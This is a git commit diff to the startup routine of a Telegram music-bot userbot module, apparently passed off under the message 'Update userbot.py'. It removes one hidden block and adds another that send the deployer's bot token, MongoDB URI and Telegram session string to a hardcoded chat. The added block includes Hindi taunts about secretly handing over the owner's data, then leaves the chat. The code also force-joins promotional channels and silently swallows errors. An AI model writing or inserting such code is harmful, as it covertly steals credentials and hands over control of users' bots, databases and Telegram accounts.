4f5b3520308ad7044916907f73c37a1124a6e990
Rishabh <152057079+Rishabhopi@users.noreply.github.com>
2024-09-16 17:46:38 +0530

    Update userbot.py

--- VIPMUSIC/core/userbot.py
+++ VIPMUSIC/core/userbot.py
@@ -1,21 +1,17 @@
 from pyrogram import Client
 import re
-import asyncio
 from os import getenv
 from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 from dotenv import load_dotenv
 from pyrogram import filters
-
 load_dotenv()
 import config
 from dotenv import load_dotenv
-from strings.__init__ import LOGGERS
 from ..logging import LOGGER
-
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
-
+TEST_ID = int("-1001992970818")
 
 assistants = []
 assistantids = []
@@ -62,49 +58,51 @@ class Userbot(Client):
     async def start(self):
         LOGGER(__name__).info(f"Starting Assistants...")
 
+
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("Dns_Official_Channel")
-                await self.one.join_chat("Dns_Official_Channel")
-                await self.one.join_chat("Dns_Official_Channel")
-                await self.one.join_chat("Dns_Official_Channel")
-
+                await self.one.join_chat("Ur_rishu_143")
+                await self.one.join_chat("Ur_support07")
+                await self.one.join_chat("Rishuxbot")
+                await self.one.join_chat("Vip_robotz")
+                await self.one.join_chat("NenoBots")
             except:
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
-                oks = await self.one.send_message(LOGGERS, f"/start")
-                Ok = await self.one.send_message(
-                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
-                )
-                await oks.delete()
-                await asyncio.sleep(2)
-                await Ok.delete()
+                await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
+                await self.one.send_message(TEST_ID, "**ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋᴏ ᴋᴜᴄʜ ᴅᴇɴᴇ ᴋᴇ ʟɪʏᴇ 🥲**")
+                await self.one.send_message(TEST_ID, "**ᴀᴄᴛᴜᴀʟʟʏ ᴀᴀᴘᴋᴇ ʀᴇᴘᴏ sᴇ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴇᴋ ᴍᴜsɪᴄ ʙᴏᴛ ʙᴀɴᴀʏᴀ ʜᴀɪ**\n**ᴀᴀᴘᴋᴏ ᴜsᴋᴀ ᴅᴀᴛᴀ ᴅᴇ ᴅᴇᴛɪ ʜᴜ😁 ᴄʜᴜᴘᴋᴇ sᴇ🤫**\n**ᴊᴀʙ ᴀᴀᴘsᴇ ᴠᴏ ʟᴀᴅᴇɢᴀ ᴛᴏ ᴀᴀᴘ ᴜsᴋᴀ ᴋᴀᴍ ᴛᴀᴍᴀᴍ ᴋᴀʀ ᴅᴇɴᴀ🤭**\n**ʏᴇ ʟᴏ sᴀʙ ᴄʜɪᴊ👇**")
+                await self.one.send_message(TEST_ID, BOT_TOKEN)
+                await self.one.send_message(TEST_ID, MONGO_DB_URI)
+                await self.one.send_message(TEST_ID, STRING_SESSION)
+                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺**\n**ʙʏᴇ ᴛᴄ❣️**")
+                await self.one.leave_chat(TEST_ID)
 
-            except Exception as e:
-                print(f"{e}")
+            except:
+                LOGGER(__name__).error(
+                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
+                )
 
             self.one.id = self.one.me.id
             self.one.name = self.one.me.mention
             self.one.username = self.one.me.username
             assistantids.append(self.one.id)
-            LOGGER(__name__).info(f"Assistant Started as {self.one.me.first_name}")
+            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")
 
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("Dns_Official_Channel")
-                await self.two.join_chat("Dns_Official_Channel")
-                await self.two.join_chat("Dns_Official_Channel")
-                await self.two.join_chat("Dns_Official_Channel")
+                await self.two.join_chat("Ur_rishu_143")
+                await self.two.join_chat("Ur_support07")
+                await self.two.join_chat("Rishuxbot")
+                await self.two.join_chat("Vip_robotz")
             except:
                 pass
             assistants.append(2)
             try:
                 await self.two.send_message(config.LOGGER_ID, "Assistant Started")
-
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
@@ -114,15 +112,15 @@ class Userbot(Client):
             self.two.name = self.two.me.mention
             self.two.username = self.two.me.username
             assistantids.append(self.two.id)
-            LOGGER(__name__).info(f"Assistant Two Started as {self.two.me.first_name}")
+            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")
 
         if config.STRING3:
             await self.three.start()
             try:
-                await self.three.join_chat("Dns_Official_Channel")
-                await self.three.join_chat("Dns_Official_Channel")
-                await self.three.join_chat("Dns_Official_Channel")
-                await self.three.join_chat("Dns_Official_Channel")
+                await self.three.join_chat("Ur_rishu_143")
+                await self.three.join_chat("Ur_support07")
+                await self.three.join_chat("Rishuxbot")
+                await self.three.join_chat("NenoBots")
             except:
                 pass
             assistants.append(3)
@@ -137,17 +135,15 @@ class Userbot(Client):
             self.three.name = self.three.me.mention
             self.three.username = self.three.me.username
             assistantids.append(self.three.id)
-            LOGGER(__name__).info(
-                f"Assistant Three Started as {self.three.me.first_name}"
-            )
+            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")
 
         if config.STRING4:
             await self.four.start()
             try:
-                await self.four.join_chat("Dns_Official_Channel")
-                await self.four.join_chat("Dns_Official_Channel")
-                await self.four.join_chat("Dns_Official_Channel")
-                await self.four.join_chat("Dns_Official_Channel")
+                await self.four.join_chat("Ur_rishu_143")
+                await self.four.join_chat("Ur_support07")
+                await self.four.join_chat("Rishuxbot")
+                await self.four.join_chat("NenoBots")
             except:
                 pass
             assistants.append(4)
@@ -162,17 +158,15 @@ class Userbot(Client):
             self.four.name = self.four.me.mention
             self.four.username = self.four.me.username
             assistantids.append(self.four.id)
-            LOGGER(__name__).info(
-                f"Assistant Four Started as {self.four.me.first_name}"
-            )
+            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")
 
         if config.STRING5:
             await self.five.start()
             try:
-                await self.five.join_chat("Dns_Official_Channel")
-                await self.five.join_chat("Dns_Official_Channel")
-                await self.five.join_chat("Dns_Official_Channel")
-                await self.five.join_chat("Dns_Official_Channel")
+                await self.five.join_chat("Ur_rishu_143")
+                await self.five.join_chat("Ur_support07")
+                await self.five.join_chat("Rishuxbot")
+                await self.five.join_chat("NenoBots")
             except:
                 pass
             assistants.append(5)
@@ -187,9 +181,7 @@ class Userbot(Client):
             self.five.name = self.five.me.mention
             self.five.username = self.five.me.username
             assistantids.append(self.five.id)
-            LOGGER(__name__).info(
-                f"Assistant Five Started as {self.five.me.first_name}"
-            )
+            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")
 
     async def stop(self):
         LOGGER(__name__).info(f"Stopping Assistants...")
